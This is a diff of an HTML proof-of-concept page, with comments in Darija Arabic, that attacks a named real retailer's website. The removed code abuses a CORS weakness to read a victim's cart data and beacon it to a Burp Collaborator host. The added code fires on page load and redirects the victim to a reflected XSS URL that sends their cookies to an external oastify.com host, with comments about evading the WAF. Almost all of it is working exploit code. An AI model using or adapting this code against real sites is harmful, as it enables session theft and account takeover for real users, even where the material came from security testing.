@@ -1,31 +1,22 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>PoC - Account Data Exfiltration</title>
-</head>
-<body>
-    <h1>Testing... Please wait.</h1>
+<html>
+<body onload="launchAttack()">
     <script>
-        // هاد الكود كيستغل ثغرة الـ CORS اللي كتيق فـ الدومين ديالك
-        fetch("https://www.decathlon.com/cart.json", {
-            method: "GET",
-            credentials: "include" // ضروري باش يجر الكوكيز ديال الضحية
-        })
-        .then(response => {
-            if (!response.ok) throw new Error('Network response was not ok');
-            return response.json();
-        })
-        .then(data => {
-            // تحويل البيانات لـ Base64 باش تهرب من الـ WAF وتوصل لـ Collaborator
-            let encodedData = btoa(JSON.stringify(data));
+        function launchAttack() {
+            // الرابط ديالك فـ Burp Collaborator
+            var collab = "bq5fhfaet10n0yflkr53beqvbmhd58tx.oastify.com";
             
-            // إرسال "الغنيمة" لـ Collaborator ديالك
-            navigator.sendBeacon("laz67fhyptq5z6l9ukm9kg684zaqyqmf.oastify.com?exfil=" + encodedData);
+            // الـ Payload اللي غايتنفذ وسط ديكاثلون (مشر بالـ Base64 باش ما يتكشفش)
+            // هاد الكود كيهز الكوكيز ويصيفطهم لـ Burp
+            var payload = "fetch('https://" + collab + "/?exfil=' + btoa(document.cookie))";
             
-            console.log("Data sent to collaborator!");
-        })
-        .catch(error => {
-            console.error("Fetch error:", error);
-            // محاولة إرسال الخطأ لـ Collaborator للتشخيص
-            navigator.sendBeacon("https://bq5fhfaet10n0yflkr53beqvbmhd58
+            // الرابط الملعون ديال Decathlon مع الـ XSS اللي لقيتي
+            // استعملنا </h1></title> باش نهربو من السجن ديال الكود
+            var targetUrl = "https://www.decathlon.com/search?q=</h1></title><script>" + payload + "<\/script>";
+
+            // توجيه الضحية للرابط أوتوماتيكياً
+            window.location.href = targetUrl;
+        }
+    </script>
+</body>
+</html>
